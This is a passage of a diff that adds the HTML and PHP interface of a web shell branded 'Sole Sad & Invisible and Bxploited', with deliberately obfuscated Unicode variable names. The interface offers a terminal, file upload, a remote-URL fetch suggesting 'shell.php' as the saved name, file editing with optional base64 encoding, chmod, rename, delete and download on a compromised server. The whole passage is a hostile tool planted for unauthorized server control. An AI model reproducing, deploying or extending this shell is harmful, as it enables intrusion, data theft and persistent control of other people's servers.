+        method="post"
+        id="edit-form"
+    >
+
+        <input
+            type="hidden"
+            name="file"
+            value="<?=htmlspecialchars($ᛖ㉉ぁ㻁ᚢ̧)?>"
+        >
+
+        <input
+            type="hidden"
+            name="content_b64"
+            id="content_b64"
+            value=""
+        >
+
+        <textarea
+            name="content"
+        ><?=htmlspecialchars($ﬅﬅ̈̆)?></textarea>
+
+
+        <label>
+
+            <input
+                type="checkbox"
+                id="use_b64"
+            >
+
+            Send as base64
+
+        </label>
+
+
+        <button name="save">
+            SAVE CHANGES
+        </button>
+
+
+        <a
+            class="btn"
+            href="?p=<?=url_path($ᛇぁ̣́̈)?>"
+        >
+            CANCEL
+        </a>
+
+    </form>
+
+</div>
+
+
+<script>
+
+document
+.getElementById('edit-form')
+.addEventListener(
+    'submit',
+    function(){
+
+        var useB64 =
+            document.getElementById(
+                'use_b64'
+            );
+
+        var flag =
+            document.getElementById(
+                'content_b64'
+            );
+
+        var content =
+            this.elements.content;
+
+        if (!useB64.checked){
+
+            flag.value = '';
+
+            return;
+        }
+
+        var bytes =
+            new TextEncoder()
+            .encode(content.value);
+
+        var binary = '';
+
+        for(
+            var i = 0;
+            i < bytes.length;
+            i++
+        ){
+
+            binary +=
+                String.fromCharCode(
+                    bytes[i]
+                );
+        }
+
+        content.value =
+            btoa(binary);
+
+        flag.value = '1';
+    }
+);
+
+</script>
+
+
+</body>
+
+</html>
+
+<?php
+exit;
+}
+
+
+/* =========================================================
+   MAIN PAGE
+========================================================= */
+
+?>
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta charset="utf-8">
+
+<title>
+Sole Sad & Invisible and Bxploited ☣️ WE ARE ALIVE. 
+</title>
+
+<style>
+<?= $ﬕﬓﾚ̧̩̣́ ?>
+</style>
+
+</head>
+
+
+<body>
+
+
+<!-- HEADER -->
+
+<div class="panel Hackerone-header">
+
+    <div class="brand">
+
+        <div class="brand-icon">
+            V
+        </div>
+
+        <div>
+
+            <div class="brand-title">
+                31337
+            </div>
+
+            <div class="brand-sub">
+                 File Manager
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <div class="Hackerone-badge">
+        Hackerone ACCESS
+    </div>
+
+</div>
+
+
+<!-- NAV -->
+
+<div class="panel nav">
+
+    <a
+        href="?p=<?=url_path(__DIR__)?>"
+    >
+        ⌂ HOME
+    </a>
+
+
+    <a
+        href="?p=<?=url_path($ᛇぁ̣́̈)?>&term=1"
+    >
+        ◈ TERMINAL
+    </a>
+
+
+    <span class="path">
+
+        PATH:
+
+        <?=htmlspecialchars($ᛇぁ̣́̈)?>
+
+    </span>
+
+</div>
+
+
+<!-- ALERT -->
+
+<?php
+
+renderUploadAlert(
+    $ぁᚦぁᛗ̤̋̇,
+    $ᛃ㼁̋̈
+);
+
+?>
+
+
+<!-- STANDARD UPLOAD -->
+
+<div class="panel toolbar">
+
+    <div class="section-title">
+        File Operations
+    </div>
+
+
+    <form
+        method="post"
+        enctype="multipart/form-data"
+        id="upload-form"
+    >
+
+        <div class="toolbar-row">
+
+            <span class="label">
+                Upload
+            </span>
+
+
+            <input
+                type="file"
+                name="f"
+                id="upload-file"
+            >
+
+
+            <select
+                id="upload-mode"
+            >
+
+                <option value="normal">
+                    Mode 1 — Multipart
+                </option>
+
+                <option value="stream">
+                    Mode 2 — Stream Copy
+                </option>
+
+            </select>
+
+
+            <button
+                name="up"
+                id="upload-btn"
+            >
+                UPLOAD
+            </button>
+
+        </div>
+
+
+        <div class="toolbar-row">
+
+            <span class="label">
+                Create
+            </span>
+
+
+            <input
+                type="text"
+                name="n"
+                placeholder="filename"
+            >
+
+
+            <button name="new">
+                CREATE FILE
+            </button>
+
+
+            <input
+                type="text"
+                name="d"
+                placeholder="folder"
+            >
+
+
+            <button name="mkdir">
+                CREATE FOLDER
+            </button>
+
+        </div>
+
+    </form>
+
+</div>
+
+
+<!-- URL UPLOAD -->
+
+<div class="panel toolbar url-upload">
+
+    <div class="section-title">
+        Remote Upload 
+    </div>
+
+
+    <form method="post">
+
+
+        <div class="toolbar-row">
+
+            <span class="label">
+                URL
+            </span>
+
+
+            <input
+                type="url"
+                name="url"
+                placeholder="https://example.com/file.jpg"
+                style="flex:1;min-width:260px"
+                required
+            >
+
+        </div>
+
+
+        <div class="toolbar-row">
+
+            <span class="label">
+                Save As
+            </span>
+
+
+            <input
+                type="text"
+                name="filename"
+                placeholder="shell.php"
+                required
+            >
+
+
+            <select name="method">
+
+                <option value="file_get_contents">
+                    file_get_contents
+                </option>
+
+            </select>
+
+
+            <button type="submit">
+                DOWNLOAD URL
+            </button>
+
+        </div>
+
+
+    </form>
+
+
+    <div class="url-note">
+
+        Allowed domains:
+
+        <strong>
+            <?=htmlspecialchars(
+                implode(
+                    ', ',
+                    $ね̧́̅
+                )
+            )?>
+        </strong>
+
+        · Maximum:
+
+        <strong>
+            10 MB
+        </strong>
+
+        · HTTPS only
+
+    </div>
+
+</div>
+
+
+<!-- FILE TABLE -->
+
+<div class="panel table-wrap">
+
+<table>
+
+<tr>
+
+    <th>
+        Name
+    </th>
+
+    <th>
+        Size
+    </th>
+
+    <th>
+        Permissions
+    </th>
+
+    <th>
+        Actions
+    </th>
+
+</tr>
+
+
+<?php
+
+if ($ᛇぁ̣́̈ !== '/'):
+
+?>
+
+<tr>
+
+<td colspan="4">
+
+<a
+    href="?p=<?=url_path(dirname($ᛇぁ̣́̈))?>"
+>
+    ↩ .. UP
+</a>
+
+</td>
+
+</tr>
+
+<?php
+
+endif;
+
+?>
+
+
+<?php
+
+$㉆̦̣ =
+    @scandir($ᛇぁ̣́̈) ?: [];
+
+$㉉ﬅ㉆ﬓﬁ̥̈ = [];
+$ᛃᛒね㈲̨́ = [];
+
+
+foreach(
+    $㉆̦̣ as $ㄉ̩ﬗﬅᛜ̇̄̉
+){
+
+    if (
+        $ㄉ̩ﬗﬅᛜ̇̄̉ === '.' ||
+        $ㄉ̩ﬗﬅᛜ̇̄̉ === '..'
+    ){
+        continue;
+    }
+
+
+    is_dir(
+        $ᛇぁ̣́̈ . '/' . $ㄉ̩ﬗﬅᛜ̇̄̉
+    )
+    ? $㉉ﬅ㉆ﬓﬁ̥̈[] = $ㄉ̩ﬗﬅᛜ̇̄̉
+    : $ᛃᛒね㈲̨́[] = $ㄉ̩ﬗﬅᛜ̇̄̉;
+}
+
+
+sort($㉉ﬅ㉆ﬓﬁ̥̈);
+sort($ᛃᛒね㈲̨́);
+
+
+/* DIRECTORIES */
+
+foreach(
+    $㉉ﬅ㉆ﬓﬁ̥̈ as $ま̣̦̣
+):
+
+    $ᛈ̧̊ᛉ㌁̈̄ =
+        $ᛇぁ̣́̈ . '/' . $ま̣̦̣;
+
+    $ᛇら̂ᛗぁ̨̨̥ =
+        is_writable($ᛈ̧̊ᛉ㌁̈̄)
+        ? 'w'
+        : 'nw';
+
+?>
+
+<tr>
+
+<td class="name dir">
+
+    📁
+
+    <a
+        href="?p=<?=url_path($ᛈ̧̊ᛉ㌁̈̄)?>"
+    >
+        <?=htmlspecialchars($ま̣̦̣)?>/
+    </a>
+
+</td>
+
+
+<td>
+    —
+</td>
+
+
+<td class="perm <?=$ᛇら̂ᛗぁ̨̨̥?>">
+
+    <?=perms($ᛈ̧̊ᛉ㌁̈̄)?>
+
+</td>
+
+
+<td>
+
+
+<form
+    class="action-form"
+    method="post"
+>
+
+<input
+    type="hidden"
+    name="old"
+    value="<?=htmlspecialchars($ま̣̦̣)?>"
+>
+
+<input
+    type="text"
+    name="new"
+    value="<?=htmlspecialchars($ま̣̦̣)?>"
+>
+
+<button name="ren">
+    REN
+</button>
+
+</form>
+
+
+<form
+    class="action-form"
+    method="post"
+>
+
+<input
+    type="hidden"
+    name="t"
+    value="<?=htmlspecialchars($ま̣̦̣)?>"
+>
+
+<input
+    type="text"
+    name="m"
+    value="<?=perms($ᛈ̧̊ᛉ㌁̈̄)?>"
+>
+
+<button name="chmod">
+    CHMOD
+</button>
+
+</form>
+
+
+<a
+    class="delbtn"
+    href="?p=<?=url_path($ᛇぁ̣́̈)?>&del=<?=urlencode($ま̣̦̣)?>"
+    onclick="return confirm('Delete directory?')"
+>
+    DELETE
+</a>
+
+
+</td>
+
+</tr>
+
+<?php
+
+endforeach;
+
+
+/* FILES */
+
+foreach(
+    $ᛃᛒね㈲̨́ as $ﬓ㻁㲁̩̌
+):
+
+    $ᛈ̧̊ᛉ㌁̈̄ =
+        $ᛇぁ̣́̈ . '/' . $ﬓ㻁㲁̩̌;
+
+    $ᛇら̂ᛗぁ̨̨̥ =
+        is_writable($ᛈ̧̊ᛉ㌁̈̄)
+        ? 'w'
+        : 'nw';
+
+?>
+
+<tr>
+
+<td class="name">
+
+    📄
+
+    <?=htmlspecialchars($ﬓ㻁㲁̩̌)?>
+
+</td>
+
+
+<td>
+    <?=filesize($ᛈ̧̊ᛉ㌁̈̄)?>
+</td>
+
+
+<td class="perm <?=$ᛇら̂ᛗぁ̨̨̥?>">
+
+    <?=perms($ᛈ̧̊ᛉ㌁̈̄)?>
+
+</td>
+
+
+<td>
+
+
+<form
+    class="action-form"
+    method="post"
+>
+
+<input
+    type="hidden"
+    name="old"
+    value="<?=htmlspecialchars($ﬓ㻁㲁̩̌)?>"
+>
+
+<input
+    type="text"
+    name="new"
+    value="<?=htmlspecialchars($ﬓ㻁㲁̩̌)?>"
+>
+
+<button name="ren">
+    REN
+</button>
+
+</form>
+
+
+<form
+    class="action-form"
+    method="post"
+>
+
+<input
+    type="hidden"
+    name="t"
+    value="<?=htmlspecialchars($ﬓ㻁㲁̩̌)?>"
+>
+
+<input
+    type="text"
+    name="m"
+    value="<?=perms($ᛈ̧̊ᛉ㌁̈̄)?>"
+>
+
+<button name="chmod">
+    CHMOD
+</button>
+
+</form>
+
+
+<a
+    class="btn"
+    href="?p=<?=url_path($ᛇぁ̣́̈)?>&dl=<?=urlencode($ﬓ㻁㲁̩̌)?>"
+>
+    DOWNLOAD
+</a>
+
+
+<a
+    class="btn"
+    href="?p=<?=url_path($ᛇぁ̣́̈)?>&edit=<?=urlencode(hex_encode($ﬓ㻁㲁̩̌))?>"
+>
+    EDIT
+</a>
+
+
+<a
+    class="delbtn"
+    href="?p=<?=url_path($ᛇぁ̣́̈)?>&del=<?=urlencode($ﬓ㻁㲁̩̌)?>"
+    onclick="return confirm('Delete file?')"
+>
+    DELETE
+</a>
+
+
+</td>
+
+</tr>
+
+<?php
+
+endforeach;
+
+?>
+
+</table>
+
+</div>
+
+
+<div class="footer">
+
+    solevisible@rootcyberpunks@gmail.com
+
+</div>
+
+
+<script>
+
+document
+.getElementById('upload-form')
+.addEventListener(
+    'submit',
+    function(){
+
+        var mode =
+            document.getElementById(
+                'upload-mode'
+            ).value;
+
+        document
+            .getElementById(
+                'upload-btn'
+            )
+            .name =
+                mode === 'stream'
+                ? 'up_stream'
+                : 'up';
+
+    }
+);
+
+</script>
+
+
+</body>
+
+</html>
